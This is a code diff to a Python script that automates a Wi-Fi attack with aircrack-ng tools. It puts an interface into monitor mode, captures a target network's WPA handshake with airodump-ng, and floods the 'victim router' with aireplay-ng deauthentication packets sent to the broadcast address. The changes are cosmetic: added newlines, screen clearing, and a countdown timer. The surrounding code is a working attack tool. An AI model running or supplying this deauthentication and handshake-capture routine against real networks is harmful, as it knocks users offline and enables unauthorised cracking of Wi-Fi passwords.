@@ -8,7 +8,7 @@ import signal
 
 def ctrl_c(signum, frame):
     get_colours("\n[!] Stopping attack...", "mangeta")
-    get_colours("\n[!] Clearing Temporary files..", "red")
+    get_colours("\n\n[!] Clearing Temporary files..", "red")
     get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
@@ -142,15 +142,23 @@ def attack_func(network_interface, attack_mode):
             process.kill()
         get_current_path = subprocess.check_output('pwd').strip()
         set_path = f'{get_current_path.decode()}/Capture'
-        get_colours("\n[*] Waiting 65 Seconds for the Handshake", 'cyan')
+        get_colours("\n[*] Waiting for the Handshake", 'cyan')
         os.system(
             f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
         time.sleep(5)
         os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
-        get_colours("\n[*] Sending deauthentication packets to victim router", 'cyan')
+        time.sleep(2)
+        subprocess.run(["clear"])
+        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
-        time.sleep(65)
+        timer_process = 65
+        for i in range(timer_process):
+            get_colours(f"[*] Time Left: \t\t{timer_process}", 'yellow')
+            sys.stdout.write("\033[F")  # Cursor up one line
+            time.sleep(1)
+            timer_process = timer_process - 1
+        # time.sleep(65)
         for line in out.splitlines():
             if b'xterm' in line:
                 pid = int(line.split(None, 1)[0])
@@ -211,7 +219,7 @@ def quit_program():
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
     subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
-    get_colours("[*] Network set to it's normal mode...", "magenta")
+    get_colours("\n[*] Network set to it's normal mode...", "magenta")
     print(Fore.WHITE)
     exit(0)
 
